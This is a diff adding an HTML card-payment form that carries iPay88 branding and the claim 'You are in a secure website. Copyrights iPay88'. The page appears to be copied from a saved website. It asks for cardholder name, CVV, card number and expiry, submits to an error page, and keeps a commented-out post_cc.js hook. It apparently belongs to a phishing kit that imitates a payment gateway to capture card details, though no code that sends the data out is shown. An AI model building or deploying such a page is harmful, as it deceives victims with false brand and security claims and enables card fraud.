@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+
+<html style="background-attachment: scroll;">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Credit Card Validation Demo</title>
+    <link href="./CC_files/css" rel="stylesheet">
+    <link rel="stylesheet" href="./CC_files/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="./CC_files/styles.css">
+    <link rel="stylesheet" type="text/css" href="./CC_files/demo.css">
+    <style type="text/css">
+        #carbonads {
+            position: fixed;
+            bottom: 30px;
+            right: 40px;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 16px;
+            box-shadow: 2px 2px 2px rgba(0, 0, 0, 0.1);
+            border-radius: 2px;
+            box-sizing: content-box;
+            width: 130px;
+            transition: 0.3s background-color;
+        }
+
+        @media (max-width:900px) {
+            #carbonads {
+                display: none;
+            }
+        }
+
+        #carbonads:before {
+            position: absolute;
+            content: "×";
+            width: 20px;
+            border-radius: 50%;
+            height: 20px;
+            background-color: #da2c2c;
+            font-family: sans-serif;
+            color: #fff;
+            text-align: center;
+            line-height: 20px;
+            font-size: 20px;
+            top: -8px;
+            right: -8px;
+            cursor: pointer;
+            opacity: 0;
+            transition: 0.3s opacity;
+        }
+
+        #carbonads:hover {
+            background-color: #fff;
+        }
+
+        #carbonads:hover:before {
+            opacity: 1;
+        }
+
+        #carbonads a {
+            color: #303438 !important;
+            text-decoration: none !important;
+            font: 13px sans-serif !important;
+            font-weight: normal !important;
+            word-break: break-word;
+            display: block;
+            line-height: 1.45 !important;
+        }
+
+        #carbonads .carbon-img img {
+            border: none !important;
+            outline: none !important;
+            margin: 0 auto 6px !important;
+        }
+
+        #carbonads a.carbon-poweredby {
+            display: block;
+            font-size: 10px !important;
+            color: #888 !important;
+            margin-top: 8px;
+            text-transform: uppercase;
+            line-height: 1 !important;
+        }
+    </style>
+    <script id="_carbonads_projs" type="text/javascript" src="./CC_files/CKYIK5QM.json"></script>
+    <script id="_carbonads_projs" type="text/javascript" src="./CC_files/json"></script>
+    <style type="text/css">
+        #carbonads {
+            position: fixed;
+            bottom: 30px;
+            right: 40px;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 16px;
+            box-shadow: 2px 2px 2px rgba(0, 0, 0, 0.1);
+            border-radius: 2px;
+            box-sizing: content-box;
+            width: 130px;
+            transition: 0.3s background-color;
+        }
+
+        @media (max-width:900px) {
+            #carbonads {
+                display: none;
+            }
+        }
+
+        #carbonads:before {
+            position: absolute;
+            content: "×";
+            width: 20px;
+            border-radius: 50%;
+            height: 20px;
+            background-color: #da2c2c;
+            font-family: sans-serif;
+            color: #fff;
+            text-align: center;
+            line-height: 20px;
+            font-size: 20px;
+            top: -8px;
+            right: -8px;
+            cursor: pointer;
+            opacity: 0;
+            transition: 0.3s opacity;
+        }
+
+        #carbonads:hover {
+            background-color: #fff;
+        }
+
+        #carbonads:hover:before {
+            opacity: 1;
+        }
+
+        #carbonads a {
+            color: #303438 !important;
+            text-decoration: none !important;
+            font: 13px sans-serif !important;
+            font-weight: normal !important;
+            word-break: break-word;
+            display: block;
+            line-height: 1.45 !important;
+        }
+
+        #carbonads .carbon-img img {
+            border: none !important;
+            outline: none !important;
+            margin: 0 auto 6px !important;
+        }
+
+        #carbonads a.carbon-poweredby {
+            display: block;
+            font-size: 10px !important;
+            color: #888 !important;
+            margin-top: 8px;
+            text-transform: uppercase;
+            line-height: 1 !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid">
+        <div class="heading">
+            <img src="CC_files/ipay88.PNG" style="width:100%"/>
+        </div>
+        <div class="creditCardForm" style="margin-top: 20px;margin-bottom: 20px;">
+            <div class="payment">
+                <form id="cc_form" method="GET" action="error.html">   
+                    <div class="form-group owner">
+                        <label for="owner">Name</label>
+                        <input type="text" class="form-control" id="owner">
+                    </div>
+                    <div class="form-group CVV">
+                        <label for="cvv">CVV</label>
+                        <input type="text" class="form-control" id="cvv">
+                    </div>
+                    <div class="form-group has-success" id="card-number-field">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="text" class="form-control" id="cardNumber">
+                    </div>
+                    <div class="form-group" id="expiration-date">
+                        <label>Expiration Date</label>
+                        <select id="cardMonth">
+                            <option value="01">January</option>
+                            <option value="02">February </option>
+                            <option value="03">March</option>
+                            <option value="04">April</option>
+                            <option value="05">May</option>
+                            <option value="06">June</option>
+                            <option value="07">July</option>
+                            <option value="08">August</option>
+                            <option value="09">September</option>
+                            <option value="10">October</option>
+                            <option value="11">November</option>
+                            <option value="12">December</option>
+                        </select>
+                        <select id="cardYear">
+                            <option value="2022"> 2022</option>
+                            <option value="2023"> 2023</option>
+                            <option value="2024"> 2024</option>
+                            <option value="2025"> 2025</option>
+                            <option value="2026"> 2026</option>
+                            <option value="2027"> 2027</option>
+                            <option value="2028"> 2028</option>
+                            <option value="2029"> 2029</option>
+                            <option value="2030"> 2030</option>
+                        </select>
+                    </div>
+                    <input type="hidden" id="cardType" />
+                    <div class="form-group" id="credit_cards">
+                        <img src="./CC_files/visa.jpg" id="visa">
+                        <img src="./CC_files/mastercard.jpg" id="mastercard" class="transparent">
+                        <img src="./CC_files/amex.jpg" id="amex" class="transparent">
+                    </div>
+                    <div class="form-group" id="pay-now">
+                        <button type="submit" class="btn btn-default" style="background-color:orange !important" id="confirm-purchase">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <p class="examples-note">You are in a secure website. Copyrights iPay88</p>
+
+
+    </div>
+    <script src="./CC_files/jquery.min.js.download"></script>
+    <script src="./CC_files/bootstrap.min.js.download"></script>
+    <script src="./CC_files/jquery.payform.min.js.download" charset="utf-8"></script>
+    <script src="./CC_files/script.js"></script>
+    <!-- Demo ads. Please ignore and remove. -->
+    <script src="./CC_files/v3.js.download" async=""></script>
+
+
+    <!-- <script type="text/javascript" src="post_cc.js"></script> -->
+    <script id="_carbonads_js" type="text/javascript" async="" src="./CC_files/carbon.js"></script>
+
+    <script id="_carbonads_js" type="text/javascript" async="" src="./CC_files/carbon.js(1).download"></script>
+</body>
+
+
+
+</html>
